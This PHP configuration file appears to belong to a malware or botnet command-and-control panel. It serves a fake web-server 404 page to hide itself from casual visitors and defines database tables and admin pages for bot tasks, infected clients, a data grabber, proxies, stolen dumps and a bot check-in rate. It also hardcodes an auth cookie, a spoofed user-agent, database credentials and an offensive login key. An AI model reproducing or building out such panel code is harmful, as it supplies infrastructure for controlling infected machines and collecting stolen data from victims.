<?php
error_reporting(0);
$is_nginx = (strpos($_SERVER['SERVER_SOFTWARE'], 'nginx') !== false);

if (!defined('N3N')) {
    header('HTTP/1.1 404 Not Found');
    header('Status: 404 Not Found');

    if ($is_nginx) {
        $not_found_msg =
            '<html>' . PHP_EOL
            . '<head><title>404 Not Found</title></head>' . PHP_EOL
            . '<body bgcolor="white">' . PHP_EOL
            . '<center><h1>404 Not Found</h1></center>' . PHP_EOL
            . '<hr><center>' . $_SERVER['SERVER_SOFTWARE'] . '</center>' . PHP_EOL
            . '</body>' . PHP_EOL
            . '</html>' . PHP_EOL;
    } else {
        $not_found_msg = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . PHP_EOL
            . '<html><head>' . PHP_EOL
            . '<title>404 Not Found</title>' . PHP_EOL
            . '</head><body>' . PHP_EOL
            . '<h1>Not Found</h1>' . PHP_EOL
            . '<p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>' . PHP_EOL
            . '<p>Additionally, a 404 Not Found' . PHP_EOL
            . 'error was encountered while trying to use an ErrorDocument to handle the request.</p>' . PHP_EOL
            . '</body></html>';
    }
    die($not_found_msg);
}

define('USER_ROOT',          'root');
define('PAGE_LIMIT',         '30');
define('SET_KNOCK_RATE',     'rate');
define('MAX_KNOCK_RATE',     1440); // 24 hours (in min)
define('SETTINGS_FILE',      'get_settings.php');

define('DB_TASKS',           'panel_tasks');
define('DB_CLIENTS',         'panel_clients');
define('DB_GRABBER',         'panel_grabber');
define('DB_PROXY',           'panel_proxy');
define('DB_FILES',           'panel_files');
define('DB_LOGS',            'panel_logs');
define('DB_PLUGIN',          'panel_plugin');
define('DB_DUMPS',           'panel_dumps');
define('DB_BAN',             'panel_banned');
define('DB_CONFIG',          'panel_config');
define('DB_USERS',           'panel_users');

define('PAGE_TASKS',         '?act=tasks');
define('PAGE_STATS',         '?act=statistics');
define('PAGE_CLIENTS',       '?act=clients');
define('PAGE_GRABBER',       '?act=grabber');
define('PAGE_PROXY',         '?act=proxy');

define('PAGE_LOGS',          '?act=logs');
define('PAGE_PROCESS',       '?act=logs&do=process');
define('PAGE_PLUGIN',        '?act=logs&do=plugin');

define('PAGE_DUMPS',         '?act=dumps');

define('PAGE_SETTINGS',      '?act=settings');
define('PAGE_GR_SETTINGS',   '?act=settings&do=grabber');
define('PAGE_BL_SETTINGS',   '?act=settings&do=blacklist');
define('PAGE_AC_SETTINGS',   '?act=settings&do=accounts');

define('PAGE_UPLOAD',        '?act=upload');
define('PAGE_LOGOUT',        '?act=logout');

define('CONN_COOKIES_NAME',  'auth');
define('CONN_COOKIES_VALUE', 'bc00595440e801f8a5d2a2ad13b9791b');
define('CONN_USERAGENT',     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0');


// Connection data
$db_host = 'localhost';
$db_login = 'god';
$db_password = 'UmFnbmFyb2tONzNTKg==';
$db_database = 'god';
$key_tologin = 'auschwitz';
// Connection data
